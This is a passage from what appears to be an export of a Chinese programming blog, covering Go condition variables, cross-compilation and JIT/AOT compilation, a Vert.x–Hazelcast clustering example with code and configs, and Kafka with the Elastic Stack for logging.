时间成本，干吗不用事件驱动范式指导编程呢？具体来说，模拟投票程序中的主协程只在票数可能已到预期的情况下判断条件（若干子协程对共享变量的写入完成后通知主协程）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) func main() { rand.Seed(time.Now().UnixNano()) total, err := strconv.Atoi(os.Args[1]) if err != nil { panic(err) } overHalf := total/2 + 1 count := 0 finished := 0 var mu sync.Mutex cond := sync.NewCond(\u0026amp;mu) for i := 0; i \u0026lt; total; i++ { go func() { vote := requestVote() mu.Lock() defer mu.Unlock() if vote { count++ } finished++ cond.Signal() }() } mu.Lock() for count \u0026lt; overHalf \u0026amp;\u0026amp; finished \u0026lt; total { cond.Wait() } fmt.Printf(\u0026#34;count: %d\\n\u0026#34;, count) fmt.Printf(\u0026#34;finished: %d\\n\u0026#34;, finished) fmt.Printf(\u0026#34;count \u0026gt;= overHalf: %t\\n\u0026#34;, count \u0026gt;= overHalf) mu.Unlock() } func requestVote() bool { time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond) return rand.Int()%2 == 0 } 条件变量（condition variable）是一种使线程/协程等待另一个线程/协程执行特定操作的机制，与互斥锁同属于同步原语（synchronization primitives）。\n不难发现条件变量是通过互斥锁来创建，而且在等待（Wait()）之前需要先锁定（Lock()）（Java 的 wait/notify 和 Condition 也有类似要求），为什么条件变量需要或者依赖互斥锁？\n条件变量可能被并发访问，考虑将访问条件变量的代码移动到临界区（锁定的代码块）。\n协程在临界区调用 cond.Wait() 时释放互斥锁（否则准备发送通知的协程一直锁定失败），即“暂停”。\n协程在临界区调用 cond.Signal() 或 cond.Broadcast() 通知“暂停”的协程准备锁定；协程释放互斥锁后的某时刻，被通知的协程重获互斥锁成功后从 cond.Wait() 返回，即“恢复”（继续执行其余代码）。\n烂尾 你准备好了吗？\n你准备好了吗？\n你准备好了吗？\n\u0026hellip;\u0026hellip;\n别再问了，准备好了就通知你。\n本文首发于 https://h2cone.github.io\n参考资料 Are “data races” and “race condition” actually the same thing in context of concurrent programming\nRace Condition vs. Data Race\nWhy do pthreads’ condition variable functions require a mutex?\nHow To Avoid Busy Waiting\n","date":"2021-03-08T23:05:33+08:00","permalink":"https://h2cone.github.io/2021/03/08/busy_waiting/","title":"忙等"},{"content":"一次交叉编译体验 有一个项目使用高级编程语言创建原生进程（native process）来执行 Shell 脚本，其中有一段用于编辑特定配置文件的代码片段。\n1 2 3 4 for name in $names; do eval expr=\u0026#39;$\u0026#39;\u0026#34;$name\u0026#34; sed -i -e \u0026#34;s/\u0026lt;@${name}@\u0026gt;/${expr}/g\u0026#34; ${file%.*}.${component_instance} done sed（stream editor）是一个用于过滤和转换文本的 Unix 程序。\n1 2 # 将 file.txt 中的 before 就地替换为 after sed -i -e \u0026#39;s/before/after/g\u0026#39; file.txt 用法还算简单，但是，如果 after 包含特殊字符，比如传递包含正则表达式的多行代码（想象一下 Logstash 配置），运行时将极有可能发生类似错误：unknown option to s'。如果要对特殊字符进行转义，这种方案不仅复杂还易错，甚至可能会更改“间接调用” Shell 脚本的应用程序代码。换个角度，sed 是否有更好的替代品？\n感谢使用 Rust 重写一切的开源软件作者们，sd 完全可以代替 sed，而且能识别特殊字符。\n1 sd -s before after file.txt 兴致勃勃从 releases 下载可执行文件，却遇到因为开发/测试环境的 glibc 版本不符合 sd 的要求从而导致无法正常执行。\n1 2 $ ./sd-v0.7.6-x86_64-unknown-linux-musl --help ./sd-v0.7.6-x86_64-unknown-linux-musl: /lib64/libc.so.6: version `GLIBC_2.18\u0026#39; not found (required by ./sd-v0.7.6-x86_64-unknown-linux-musl) 升级 glibc 有一定风险，管理员不一定允许升级，而且客户/用户也不一定允许在线安装 sd。理想情况下，只需要提前在本地将 sd 源代码编译成目标服务器的可执行代码，那么目标服务器就无需安装 Rust 或其它东西了。得益于 Cross-compile and link a static binary on macOS for Linux with cargo and rust，成功在 macOS Big Sur 上将 sd 源代码编译成开发/测试环境的可执行文件。\n1 2 $ file sd sd: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, not stripped 所谓交叉编译，即将源文件从运行编译器的平台生成可在其它平台执行的文件。除了 Rust 天然支持交叉编译 ，其它主流语言做得到吗？Go 开箱即支持交叉编译。\nAOT 和 JIT Java 就麻烦得多了。Oracle Java 编译器（javac）并不能将 Java 源代码（Source Code）编译成原生可执行代码，而只能编译成 Java 字节码（Bytecode）。\nJava 字节码通常与平台无关（platform-independent），由 Java 虚拟机的解释器（Bytecode Interpreter）执行（如果有的话）。很久很久以前，Sun 用“编写一次，到处运行”的口号来说明 Java 的跨平台优势，Java 跨平台是因为 Java 虚拟机不跨平台，不同的平台安装不同的 Java 虚拟机才可能运行相同的 Java 程序（不同平台的 Java 字节码解释器可以执行相同的字节码）。\n当 Java 字节码由解释器执行时，总是比编译为原生机器码的同一程序执行慢。JIT 编译器（JIT Compiler）专门缓解此问题，JIT 编译器通常在运行时将 Java 字节码编译成原生机器码（Native/Machine Code），又称动态编译。相对地说，静态编译又名 AOT 编译（Ahead-of-time compilation），AOT 编译器的编译过程（从源代码到原生机器码）发生在程序运行之前。\n1 2 3 4 5 6 #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;hello, world\\n\u0026#34;); } 一个表面上非常简单的 C 语言程序（hello.c），使用 GCC 编译后输出可执行的目标程序（hello），这个过程包括了 AOT 编译。\n1 % gcc -o hello hello.c 可执行至少意味着可通过 ./ 执行。\n1 2 % ./hello hello, world 发生了什么事？了解编译系统如何工作，对将来优化程序性能有益处。\n（深入理解计算机系统（原书第3版）1.2 程序被其他程序翻译成不同的格式）\n1 2 % file hello hello: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dd72445243a497f2f62a1e5d19185ca41181e4b5, not stripped JIT 编译器通常在预热（warmup）期工作，虽然 Java 程序启动速度会受到影响，但是方法调用（Method Invocation）发生时，Java 虚拟机将通过分析数据（Profiling）积极应用优化。例如，将调用次数已达阈值的方法（热点代码）编译成原生机器码并写入代码缓存（Code Cache），代码缓存的容量可以通过选项 -XX:ReservedCodeCacheSize 设置；将来调用同一方法时，不是解释执行（基于 Stack Machine），而是从缓存读取原生机器码直接执行（基于 Register Machine）。\n在生成原生机器码之前，JIT 编译器会先积极优化字节码。例如，方法内联（Method Inlining）、逃逸分析（Escape Analysis）、循环展开（Loop unrolling）、锁粗化（Lock Coarsening）、锁清除（Lock Elision） 等等。\n由于 Java 虚拟机隐藏了操作系统具体实现的复杂性，并给应用程序提供了简单或统一的接口，随着 Java 虚拟机的迭代升级，即使运行同一程序，也能实现更高的性能。Oracle 的 Java 默认虚拟机是 HotSpot JVM，HotSpot JVM 用 C++ 编写而成，它有两个 JIT 编译器，C1 和 C2。\nC1 适用于 Client（java –client），启动快，但峰值性能受损；C2 适用于 Server（java –server），非常适合编译热点方法，但启动慢（热身）。权衡利弊的结果可能是组合使用 C1 和 C2，Java 8 后默认开启多层编译（-XX:+TieredCompilation），先以 C1 编译，采样足够后以 C2 编译。\n所谓的 JVM 性能调优，通常聚焦在内存与 GC，若不考虑应用程序可能包含低效的部分，那不妨调参（选项或标记） 之后测试是否符合预期。真遇到了需要监视 JIT 的场景，换言之是为了性能优化或故障排查的目的分析 JIT 日志，发觉日志难读，但好在发现一款 JIT 日志分析与可视化工具——jitwatch。\nGraalVM 和 LLVM 退一步来说，借助虚拟机可以在编译时将 Java 程序编译成可执行文件。Oracle 的 GraalVM 的附加组件包括了一种将 Java 应用程序 AOT 编译为原生可执行文件的技术，名为 Native Image。\nGraalVM 是用于运行以 JavaScript、Python、Ruby、R、基于 JVM 的语言（例如 Java、Scala，Clojure，Kotlin）、基于 LLVM 的语言（例如 C 和 C ++）编写的应用程序的通用虚拟机。\nGraalVM Native Image 技术存在不容忽视的限制，原因之一是 AOT 编译参考的静态信息有时是不够的，并且很难猜测应用程序的实际行为。为了能够构建高度优化的原生可执行文件，GraalVM 会运行积极的静态分析，在编译时必须知道所有可访问的类和字节码，否则 Java 的动态特性（例如动态类加载、反射、动态代理等等）严重受限，甚至不可用。因此，GraalVM Native Image 兼容和优化指南建议用户编写配置文件“提示” GraalVM 做正确的事情。\nGraalVM Native Image 暂不支持交叉编译，但不意味不能在一个平台构建出其它平台的可执行文件。运用 操作系统级别的虚拟化即可，例如在本地下载各个平台的 GraalVM Docker 镜像，以此为基础构建可执行文件的镜像。\nGraalVM 之所以能运行不同种类的语言编写而成的应用程序的原因之一是 GraalVM 的核心组件与附加组件包含了多种运行时（Runtime）。比如运行 Java、JavaScript/Node.js、C/C++ 程序所需的环境：\nJava HotSpot VM Node.js JavaScript runtime LLVM runtime LLVM 是模块化和可重用的编译器与工具链技术的集合。\nLLVM 不是通用虚拟机（VM），但使用 LLVM 的编程语言非常之多（从LLVM 的维基百科词条第二段可以体会到）。\nLLVM 编译器通常分为三部分：前端（frond-end）、中端（middle-end）、后端（back-end）。\n前端：将源码编译为 IR。 中端：优化 IR。 后端：将 IR 编译为机器码。 IR 是中间表示（Intermediate representation）的简称，它是一种与平台无关（platform-independent）的代码/指令。\n1 % clang-11 hello.c -o hello 例如，使用 Clang 编译简单的 C 语言程序（hello.c），最终得到其可执行文件（hello，如果想观看 LLVM IR 的模样，不妨试试在浏览器编译 C 语言程序）。\n1 2 % file hello hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bf54bb50604533e477e6e42d576c573f88f2a986, not stripped 当我们想创建新的编程语言时，可以不必花费时间和精力去重新发明那些特定的轮子（例如用于编译与优化的工具），而是直接使用 LLVM 实现语言。\n从编译时开始重用 程序员们日常使用的各种库（Library）或框架（Framework）总是从编译时开始重用（Reuse），那时，彷佛站在了巨人的肩膀上。\n本文首发于 https://h2cone.github.io\n参考资料 Wiki # Ahead-of-time compilation\nWiki # Just-in-time compilation\nJVM JIT-compiler overview\n基本功 | Java即时编译器原理解析及实践\nThe Java HotSpot VM Under the Hood\nThe Java programming language Compiler Group\nWiki # Java performance\nWhat is LLVM? The power behind Swift, Rust, Clang, and more\nLLVM IR and Go\n","date":"2021-01-22T10:20:35+08:00","permalink":"https://h2cone.github.io/2021/01/22/some_things_about_compilation/","title":"编译的一些事"},{"content":"前面的话 有一个项目使用了 Vert.x 3，没想到 v4.0.0 已经发布。\n什么是 Vert.x Vert.x 是用于在 JVM 上构建 Reactive 应用程序的工具包。\n早在 2014 年反应式宣言就提出反应式（Reactive）应用程序/软件系统应具有反应灵敏（Responsive）、回弹性（Resilient）、弹性（Elastic）、消息驱动（Message Driven）等特征，这些莫名其妙的要求可以归属于前文常常提到的软件系统三大目标。\nVert.x 受到了 Node.js 启发，推荐的编程范式是事件驱动，事件可以由软件、用户、系统产生或触发，处理事件的函数通常被称为 Event Handler。\n1 2 3 4 5 6 7 8 9 10 11 import io.vertx.core.AbstractVerticle; public class Server extends AbstractVerticle { public void start() { vertx.createHttpServer().requestHandler(req -\u0026gt; { req.response() .putHeader(\u0026#34;content-type\u0026#34;, \u0026#34;text/plain\u0026#34;) .end(\u0026#34;Hello from Vert.x!\u0026#34;); }).listen(8080); } } 如上所示，使用 Vert.x 编写一个简单的 HTTP Server，其中 requestHandler 方法传入了用于处理请求事件的 Handler，Handler 表现为回调函数，即 Call­back；其中 listen 方法是非阻塞方法，线程调用非阻塞方法不会被阻塞在该方法，而是继续执行其它代码；非阻塞函数有时被称为异步函数，返回值可以被称为异步结果，仅使用 Callback 处理异步结果可能导致嵌套和凌乱的代码，被称为回调地狱。Vert.x 支持 Fu­tures/Promises 和 RxJava，前者用于优雅地链式异步操作，后者用于高级反应式编程。\nVert.x 的非阻塞 I/O 基于 Netty，在此之上构建 Vert.x Core 和 Web 后端技术栈：反应式数据库驱动、消息传递、事件流、集群、指标度量、分布式追踪等，详情请见 Vert.x Documentation。\nVert.x 的事件模型延用 Netty 的 Event Loop，欲了解来龙去脉可从 网络·NIO 开始。\nVerticle 是 Vert.x 中的基本处理单元，Verticle 实例之间通过 Event Bus 通信。Java 传统的并发模型是共享内存多线程（shared memory multithreading），如同前文 多线程·并发编程 所说，但是计算机世界还存在着其它并发模型，例如 CSP 和 Actor model，Verticles 就是宽松的 Actors。\n构建反应式应用程序/软件系统并非 Vert.x 不可，只不过 Netty 的 APIs 更底层；云原生（cloud native）时代的 Quarkus 技术栈支持反应式，Java 用户使用最多的 Spring 技术栈也支持反应式，非一般场景可以考虑 Akka。\n什么是 Hazelcast IMDG Hazelcast 有一个开源分布式内存对象存储（in-memory object store），名为 Hazelcast IMDG，IMDG 是 In-Memory Data Grid 的缩写，IMDG 与内存数据库有所不同，后者通常需要用户处理对象到关系的映射（ORM），前者支持各种各样的内存数据结构，比如 Map、Set、List、MultiMap、RingBuffer、HyperLogLog 等。\nHazelcast IMDG 的架构与分布式协调服务——Zookeeper、分布式 Key-Value 存储——etcd、端到端服务发现解决方案——Consul 截然不同，它的定位更接近分布式缓存，并且无需 Server 端，只需 Client 端的点到点通信（P2P）。\nHazelcast 集群（Hazelcast Cluster）成员（Hazelcast Member）之间为什么需要通信？\nHazelcast 成员之间共享数据的机制是数据分区与数据复制，两者结合在一起的图像可以先参考为什么分区。默认情况下，Hazelcast 提供 271 个分区，为每个分区创建单一拷贝/副本，可配置为多副本。\n上图是 4 成员/结点的 Hazelcast 集群的示意图，假设分区编号从 P_1 到 P_136，黑色编号分区代表主副本（primary replicas），蓝色编号分区代表备副本（backup replicas），数据复制方向为主到备。\n数据分区与数据复制对用户透明是现代分布式存储的基本特性。添加成员到 Hazelcast 集群时与 Redis 不同，Hazelcast 使用一致性哈希算法，仅移动最小数量的分区即可横向扩展。\nHazelcast 如何保证一致性与可用性？\nHazelcast 提供了具有不同数据结构实现的 AP 和 CP 功能。根据 CAP (Consistency, Availability and Partition Tolerance) 经验法则，Hazelcast 的 AP 数据结构侧重可用性，而 Hazelcast 的 CP 子系统则侧重一致性。\n使用 Hazelcast 实现 Vert.x 集群 Vert.x 集群无需注册中心（Service Registry）即可建立，因为 Vert.x 实例之间可以通过 Hazelcast Client Library 相互发现（Discovery）。\n使用 Hazelcast Cluster Manager 可以降低 Vert.x 集成/整合 Hazelcast 的成本。默认情况下，如果不指定外部配置文件，那么集群管理器由打包在 vertx-hazelcast-4.0.0.jar 内的 default-cluster.xml 配置，其中默认的发现机制是 Multicast。\n如上图所示，红色成员发送特定报文到监听特定端口的一组绿色成员，以此类推，发现彼此。\n1 2 3 4 5 6 7 8 9 10 11 hazelcast: network: join: multicast: enabled: true multicast-group: 224.2.2.3 multicast-port: 54327 # UDP port multicast-time-to-live: 32 multicast-timeout-seconds: 2 trusted-interfaces: - 192.168.1.102 使用 Multicast 最常见的传输层协议是 UDP；然而，不建议在生产环境使用 Multicast 发现，因为 UDP 在生产环境可能被阻止（出于安全考虑）并且其它发现机制更加精确，例如 TCP/IP 发现，其它可参考 Discovery Mechanisms。\n1 2 3 4 5 6 7 8 9 10 11 hazelcast: network: join: tcp-ip: enabled: true member-list: - machine1 - machine2 - machine3:5799 - 192.168.1.0-7 - 192.168.1.21 形成了集群之后，集群成员之间的通信始终通过 TCP/IP 进行；方便展示起见，下文的程序采用简化的服务生产者（Provider）与服务消费者（Consumer）模式：\n首先是服务生产者，该 Verticle 的启动方法（start）内仅仅是订阅/消费（consumer）EventBus 中的特定事件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public class DefaultProvider extends AbstractVerticle { private static final Logger log = LoggerFactory.getLogger(DefaultProvider.class); @Override public void start(Promise\u0026lt;Void\u0026gt; startPromise) throws Exception { vertx.eventBus().\u0026lt;JsonObject\u0026gt;consumer(BusAddress.TEST_REQUEST, msg -\u0026gt; { JsonObject body = msg.body(); log.debug(\u0026#34;consume from {}, message body: {}\u0026#34;, BusAddress.TEST_REQUEST, body); if (Objects.nonNull(body)) { body.put(\u0026#34;consumed\u0026#34;, true); } msg.reply(body); }); vertx.eventBus().\u0026lt;JsonObject\u0026gt;consumer(BusAddress.TEST_SEND, msg -\u0026gt; { JsonObject body = msg.body(); log.debug(\u0026#34;consume from {}, message body: {}\u0026#34;, BusAddress.TEST_SEND, body); }); vertx.eventBus().\u0026lt;JsonObject\u0026gt;consumer(BusAddress.TEST_PUBLISH, msg -\u0026gt; { JsonObject body = msg.body(); log.debug(\u0026#34;consume from {}, message body: {}\u0026#34;, BusAddress.TEST_PUBLISH, body); }); } } 之所以说特定事件是由于服务消费者将事件发送到 EventBus 中的特定地址。\n1 2 3 4 5 6 7 public interface BusAddress { String TEST_REQUEST = \u0026#34;test.request\u0026#34;; String TEST_SEND = \u0026#34;test.send\u0026#34;; String TEST_PUBLISH = \u0026#34;test.publish\u0026#34;; } 然后是服务消费者，该 Verticle 作为 HTTP Server，同时演示了 request、send、publish 三种发送事件到 EventBus 方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 public class HttpServer extends AbstractVerticle { private static final Logger log = LoggerFactory.getLogger(HttpServer.class); @Override public void start(Promise\u0026lt;Void\u0026gt; startPromise) throws Exception { ConfigRetriever retriever = ConfigRetriever.create(vertx); retriever.getConfig(json -\u0026gt; { JsonObject config = json.result(); Integer port = config.getInteger(\u0026#34;http.port\u0026#34;, 8080); Router router = Router.router(vertx); router.get(\u0026#34;/hello\u0026#34;).handler(this::hello); router.post().handler(BodyHandler.create()); router.post(\u0026#34;/test/request\u0026#34;).handler(this::testRequest); router.post(\u0026#34;/test/send\u0026#34;).handler(this::testSend); router.post(\u0026#34;/test/publish\u0026#34;).handler(this::testPublish); vertx.createHttpServer() .requestHandler(router) .listen(port) .onSuccess(server -\u0026gt; { log.info(\u0026#34;HTTP server started on port \u0026#34; + server.actualPort()); startPromise.complete(); } ).onFailure(startPromise::fail); }); } private void testPublish(RoutingContext context) { JsonObject reqBody = context.getBodyAsJson(); log.debug(\u0026#34;request body: {}\u0026#34;, reqBody); vertx.eventBus().publish(BusAddress.TEST_PUBLISH, reqBody); context.json(reqBody); } private void testSend(RoutingContext context) { JsonObject reqBody = context.getBodyAsJson(); log.debug(\u0026#34;request body: {}\u0026#34;, reqBody); vertx.eventBus().send(BusAddress.TEST_SEND, reqBody); context.json(reqBody); } private void testRequest(RoutingContext context) { JsonObject reqBody = context.getBodyAsJson(); log.debug(\u0026#34;request body: {}\u0026#34;, reqBody); vertx.eventBus().\u0026lt;JsonObject\u0026gt;request(BusAddress.TEST_REQUEST, reqBody, response -\u0026gt; { if (response.succeeded()) { Message\u0026lt;JsonObject\u0026gt; msg = response.result(); JsonObject msgBody = msg.body(); log.debug(\u0026#34;reply from {}, message body: {}\u0026#34;, BusAddress.TEST_REQUEST, msgBody); context.json(msgBody); } else { log.error(\u0026#34;failed to test request\u0026#34;, response.cause()); } }); } private void hello(RoutingContext context) { String address = context.request().connection().remoteAddress().toString(); MultiMap queryParams = context.queryParams(); String name = queryParams.contains(\u0026#34;name\u0026#34;) ? queryParams.get(\u0026#34;name\u0026#34;) : \u0026#34;unknown\u0026#34;; context.json( new JsonObject() .put(\u0026#34;name\u0026#34;, name) .put(\u0026#34;address\u0026#34;, address) .put(\u0026#34;message\u0026#34;, \u0026#34;Hello \u0026#34; + name + \u0026#34; connected from \u0026#34; + address) ); } } 最后，仍然是为了方便展示起见，提供一个简化的程序启动脚本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #!/bin/bash bin_dir=$(dirname \u0026#34;$0\u0026#34;) start() { case $1 in consumer) java -jar \u0026#34;$bin_dir\u0026#34;/../consumer/target/consumer-1.0.0-SNAPSHOT-fat.jar -cluster ;; provider) java -jar \u0026#34;$bin_dir\u0026#34;/../provider/target/provider-1.0.0-SNAPSHOT-fat.jar -cluster ;; *) echo \u0026#34;Unknown module: $1\u0026#34; exit 1 ;; esac } stop() { jcmd | grep \u0026#34;$1-1.0.0-SNAPSHOT-fat.jar\u0026#34; | awk \u0026#39;{print $1}\u0026#39; | xargs -I {} kill -9 {} } stopAll() { stop consumer stop provider } case $1 in start) start \u0026#34;$2\u0026#34; ;; stop) stop \u0026#34;$2\u0026#34; ;; restart) stop \u0026#34;$2\u0026#34; start \u0026#34;$2\u0026#34; ;; down) stopAll ;; *) echo \u0026#34;Usage: $0 {start \u0026lt;module\u0026gt;|stop \u0026lt;module\u0026gt;|restart \u0026lt;module\u0026gt;|down}\u0026#34; ;; esac 假如先启动其中一个模块，比如启动服务生产者。\n1 % ./dev.sh start provider 从它的日志会发现它已经成为 Hazelcast 集群的唯一成员：\n1 2 3 Members {size:1, ver:1} [ Member [192.168.0.100]:5701 - 0d97d436-ab4f-432b-abb6-10975e224044 this ] 紧接着启动服务消费者。\n1 % ./dev.sh start consumer 服务消费者的视角：\n1 2 3 4 Members {size:2, ver:2} [ Member [192.168.0.100]:5701 - 0d97d436-ab4f-432b-abb6-10975e224044 this Member [192.168.0.100]:5702 - 12740655-5ee8-4228-a723-112c2992b290 ] 服务生产者的视角：\n1 2 3 4 Members {size:2, ver:2} [ Member [192.168.0.100]:5701 - 0d97d436-ab4f-432b-abb6-10975e224044 Member [192.168.0.100]:5702 - 12740655-5ee8-4228-a723-112c2992b290 this ] 两者相互发现了对方，但是，它们是否能正常通信？\n1 2 % curl \u0026#34;localhost:8888/hello?name=huangh\u0026#34; {\u0026#34;name\u0026#34;:\u0026#34;huangh\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;0:0:0:0:0:0:0:1:51328\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Hello huangh connected from 0:0:0:0:0:0:0:1:51328\u0026#34;} 1 2 % curl localhost:8888/test/request -d \u0026#34;{\\\u0026#34;name\\\u0026#34;:\\\u0026#34;huangh\\\u0026#34;}\u0026#34; {\u0026#34;name\u0026#34;:\u0026#34;huangh\u0026#34;,\u0026#34;consumed\u0026#34;:true} 完整代码已发布，请参考 vertx-hazelcast-exp。\n写在最后 Hazelcast Management Center 可用于可视化监控和管理 Vert.x 集群。\n本文首发于 https://h2cone.github.io\n参考资料 Eclipse Vert.x and reactive in just a few words\nVert.x in Action: Asynchronous and Reactive Java\nUnderstanding Vert.x Architecture - Part I: Inside Vert.x. Comparison with Node.js\nUnderstanding Vert.x Architecture - Part II\nUnderstanding Vert.x: Event Loop\nUnderstanding Vert.x: Event Bus\nhazelcast/hazelcast\nhazelcast/hazelcast-code-samples\nhazelcast/hazelcast-go-client\nHazelcast IMDG Reference Manual # Overview\nHazelcast IMDG Reference Manual # Appendix F: Frequently Asked Questions\nHazelcast # Vert.x Cluster\netcd versus other key-value stores\nReactiverse\nVert.x Awe­some\neclipse-vertx/vert.x\nAdvanced Vert.x Guide\nVert.x Examples\nBuilding a Vert.x Native Image\n","date":"2020-12-14T14:50:54+08:00","permalink":"https://h2cone.github.io/2020/12/14/vertx-hazelcast-exp/","title":"Vert.x 与 Hazelcast"},{"content":"背景 刚入行那会，公司产品研发部正如火如荼建设微服务基础设施，其中就包括日志中心。试想一下，包含众多容器化应用程序的系统，一个服务可能会有多个实例，每个实例输出各自的日志记录；假如在客户端收到了来自服务器端的异常响应，例如 500 Internal Server Error，相应的负责人不可避免地会遇到需要通过查看容器日志来查明哪里发生故障或则什么原因导致性能下降的情景。\n负责人也许走了弯路。登录哪些服务器或跳板机？有没有访问权？需不需要通过“中介”才能获得许可或相关日志文件？查看哪些结点上的哪些服务的日志？\n负责人也以可以走已经铺好的路。直接在日志中心 Web 版搜索所需的一切日志记录；系统中所有服务的日志记录都可以被索引与检索，不仅仅可以用于故障排除，还可以用于监控、告警、数据分析等等。\n集中式日志管理 上图来自运维咖啡吧，这是一类典型的日志处理架构。\nFilebeat，轻量级日志采集器。\n考虑到基于 Docker 开发服务，应用程序的父镜像应包含 Filebeat，例如 FROM 父镜像 之后执行一系列下载、安装、设置 Filebeat 的指令。\nFilebeat 作为应用程序的 agent 可以将日志作为输入源（从日志文件读取行），再将 kafka 作为输出目的地（发送日志记录或事件到 Kafka）。\nLogstash，传输和处理日志、事件等数据。\n因为 Logstash 有许多输入插件，包括读取来自 Kafka Topic 的事件，可以作为 Kafka 的消费者。\nELK 中的 Logstash 当然支持将 Elasticsearch 作为输出目的地。\nElasticsearch，分布式 RESTful 搜索引擎。\nKibana，可视化 Elasticsearch 数据的用户界面。\n有趣的是，Elastic Stack 并不包含 Kafka，但两者在日志/事件处理领域却是经典组合。\n何时组合使用 Kafka 与 Elastic Stack 应对突发流量 在大数据领域，Kafka 以单位时间内吞吐量极高著称，所谓吞吐量是指代可处理的记录条数，Kafka 非常适用于流量削峰。早在 2014 年，Kafka 已经能达到每秒 200 万次写入（在三台廉价的机器上）。为什么 Kafka 如此之快？至少有如下原因：\n基于追加式提交日志，顺序 I/O 飞快。\n重度使用文件系统缓存。\n复杂性从生产者转移到了消费者。\n高度可水平/横向扩展。\nKafka 应对峰值或突发数据的能力远强于 Logstash，可防止单位时间输入过多日志数据导致 Logstash 成为系统的瓶颈；值得注意的是，完成本篇之时，官方的 Logstash 扩展建议也仅有一小段。\n当 ES 不可访问 当 Elasticsearch 集群不可访问时（例如升级版本或者其他理由需要暂时下线），Kafka 能够暂时保存 Filebeat 采集的日志数据，直到 Elasticsearch 和 Logstash 再次上线。\n扩展和容错 引用一张来自 Kafka: The Definitive Guide 的插图：\n消费者群组（Consumer Group）保证同一个主题（Topic）的任意分区（Partition）最多只能被组内的一个消费者使用。增加 Logstash 实例来组成一个消费者群组，它们将并发读取 Kafka Topic 中的日志消息，而不会交叠，因此能够提升单位时间内从 Kafka 到 Logstash 再到 Elasticsearch 的吞吐量；使用多个 Logstash 实例的另外一个好处是是增强系统的容错能力。\n默认情况下，当消费者加入或离开消费者群组将触发再平衡（rebalancing），Logstash 消费者的 Kafka Client 库将参与重新分配分区给消费者的过程。当群组中有若干 Logstash 实例失效时，根据再平衡协议，失去消费者的分区将被分配给现有的消费者。\n一点建议 假设 Logstash 实例组成的消费者群组 ID 为 logstash，存储应用程序日志记录的话题 ID 为 app_logs，下面是 logstash-*.conf 的输入源配置：\n1 2 3 4 5 6 7 8 9 input { kafka { bootstrap_servers =\u0026gt; \u0026#34;kafka_host_1:9092,kafka_host_2:9092\u0026#34; group_id =\u0026gt; \u0026#34;logstash\u0026#34; topics =\u0026gt; [\u0026#34;app_logs\u0026#34;] consumer_threads =\u0026gt; 8 ... } } 其中 consumer_threads 是消费者线程数（默认值是 1），理想情况下，消费者线程数之和应与分区数相等，以实现完美平衡。如果消费者线程数之和多于分区数，那么某些线程将处于空闲状态；如果消费者线程数之和少于分区数，那么某些线程将消费多个分区。举例来说，app_logs 话题的分区数为 16，最佳的部署方式很可能是将消费者线程数为 8 的 2 个 Logstash 实例部署到 2 台 CPU 核数为 8 的机器上。\n虽说 Kafka 应对突发数据或流量高峰的能力很强，但是在无法估算日志记录/事件的量级与流速之前应备不时之需。例如，使用一些“突发”主题，当单位时间内应用程序产生过多日志数据时，可以在运行时将其移动到“突发”主题，使其它主题避免不必要的流量。\n本文首发于 https://h2cone.github.io\n参考资料 Just Enough Kafka for the Elastic Stack, Part 1\nELK日志系统之通用应用程序日志接入方案\nWhy Kafka Is so Fast\nELK架构下利用Kafka Group实现Logstash的高可用\nApache Kafka Rebalance Protocol, or the magic behind your streams applications\n","date":"2020-11-22T11:32:08+08:00","permalink":"https://h2cone.github.io/2020/11/22/kafka_in_the_elk/","title":"Kafka 之于 Elastic Stack"},{"content":"什么是日志 日志是追加式的，按时间排序的记录（条目）序列。\n无关记录的格式，日志文件记录操作系统或其它软件运行时发生的事件及其时间。\n1 \u0026lt;34\u0026gt;1 2003-10-11T22:14:15.003Z mymachine.example.com su - ID47 - BOM\u0026#39;su root\u0026#39; failed for lonvick on /dev/pts/8 “应用程序日志”是人类可读的文本，比如 Syslog 和 SLF4J 等；如上所示，这是一个来自 RFC5424 的 syslog 日志消息例子，从中不难看出主机（mymachine.example.com）上的一个应用程序（su）在 2003-10-11T22:14:15.003Z 发生了 “\u0026lsquo;su root\u0026rsquo; failed for lonvick\u0026hellip;”。\n现代最流行的分布式版本控制系统中的日志记录着所有贡献者的提交历史：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 % git log ... commit 130560a769fe6da64c87f695e4665225de1faec3 Author: Daniel Smith \u0026lt;dbsmith@google.com\u0026gt; Date: Fri Jun 6 17:31:45 2014 -0700 Proofread guestbook.md commit 2c4b3a562ce34cddc3f8218a2c4d11c7310e6d56 Author: Joe Beda \u0026lt;joe.github@bedafamily.com\u0026gt; Date: Fri Jun 6 16:40:48 2014 -0700 First commit 然而，日志并非全都是人类可读的，它可能是二进制格式而只能被程序读取，作为关键抽象普遍存在于数据库系统和分布式系统之中。\n数据库日志 关系数据库系统中的日志通常用于崩溃恢复、提供一定程度的原子性与持久性、数据复制。\n预写日志 根据经验，我们确信入库数据终将会被写入磁盘。磁盘是一种 I/O 设备（参考网络·NIO # I/O），从主存复制数据到 I/O 